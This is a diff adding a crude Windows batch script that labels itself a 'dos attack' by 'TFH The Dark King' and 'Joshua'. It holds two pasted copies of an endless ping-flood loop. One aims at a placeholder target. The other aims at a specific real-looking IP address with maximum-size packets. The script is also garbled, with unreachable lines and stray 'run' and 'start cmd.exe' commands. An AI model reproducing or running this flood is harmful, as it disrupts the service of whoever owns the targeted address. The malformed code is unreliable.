@@ -1,0 +1,34 @@
+
+run
+Color 0A
+@echo off
+cls
+Set Sleep=0
+:start
+echo start dos attack written by TFH The Dark King
+:loop
+ping Insert IP -t -w 1 -n 1
+goto :loop
+Set /A Sleep+=1
+echo DisplayingSleepvalue
+echo %Sleep%
+goto start start cmd.exe
+run
+start cmd.exe
+run
+Color 0A
+@echo off
+cls
+Set Sleep=0
+:start
+echo start dos attack written by Joshua 
+:loop
+ping 67.49.5.222 -l 65500 -t -w 1 -n 1
+goto :loop
+Set /A Sleep+=1
+echo DisplayingSleepvalue
+echo %Sleep%
+goto start start cmd.exe
+run
+
+
